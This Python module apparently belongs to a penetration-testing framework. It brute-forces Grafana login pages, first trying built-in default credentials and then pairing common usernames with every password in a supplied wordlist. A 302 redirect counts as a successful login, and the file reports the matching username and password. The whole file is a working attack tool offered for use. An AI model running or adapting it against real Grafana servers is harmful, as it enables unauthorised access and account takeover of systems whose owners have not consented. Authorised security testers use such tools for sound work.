import requests
import os
import smf
from assets.wordlist.userpass import DEFAULT_CREDS, COMMON_USERS
from apps.utility.colors import C

metadata = {
    "Name": "Grafana bruteforce login",
    "Description": """
Trying to log in multiple times using the password
default and custom username and password, to match
and get user login access up to admin.
""",
    "Author": ["zxelzy"],
    "Action": [
        ["Bruteforce", {"Description": "Grafana login bypass"}],
    ],
    "DefaultAction": "Bruteforce",
    "License": "SMF License",
    "Date": "2025-08-02",
}
REQUIRED_OPTIONS = {"IP": "", "PORT": "", "PASS": ""}


def test_grafana(target_ip, port, username, password, net):
    """Trying to login to grafana using requests (HTTP POST)."""
    login_url = f"http://{target_ip}:{port}/login"
    payload = {"user": username, "password": password}
    headers = {"Content-Type": "application/json"}
    try:
        response = net.http_request("post", login_url, json=payload, headers=headers, timeout=3, redirect=False)

        if response.status_code == 302 and "location" in response.headers:
            return True
        else:
            return False
    except:
        return False


def execute(options, net):
    """Operate BruteForce on service Grafana."""
    target_ip = options.get("IP")
    port = options.get("PORT")
    wordlist_path = options.get("PASS")

    found_weak_creds = False
    try:
        for user, passwd in DEFAULT_CREDS:
            if test_grafana(target_ip, port, user, passwd, net):
                smf.printf(
                    f"{C.SUCCESS}   LOGIN SUCCESS! (Grafana) -> U:{user} P:{passwd}"
                )
                found_weak_creds = True
                break
            smf.printf(f"{C.MENU}   FAIL: {user}:{passwd}")
        if found_weak_creds:
            return

        if wordlist_path and os.path.exists(wordlist_path):
            try:
                with open(wordlist_path, "r", encoding="latin-1") as f:
                    for target_user in COMMON_USERS:
                        f.seek(0)
                        for line in f:
                            passwd = line.strip()
                            if not passwd:
                                continue
                            if test_grafana(target_ip, port, target_user, passwd, net):
                                smf.printf(
                                    f"{C.SUCCESS}   LOGIN SUCCESS! (Grafana) -> U:{target_user} P:{passwd}"
                                )
                                return
                            smf.printf(
                                f"{C.MENU}  [>] Try: U:{target_user:<20} P:{passwd:<20}",
                                end="\r",
                                flush=True,
                            )

                    smf.printf(f"{C.MENU} [!] Brute Force finish.")

            except Exception as e:
                smf.printf(f"{C.ERROR}\n [!] ERROR: {e}")
        else:
            smf.printf(f"\n{C.MENU} All attempts failed.")

    except KeyboardInterrupt:
        return
    except Exception as e:
        smf.printf("{C.ERROR}[x] GLOBAL ERROR =>", e)
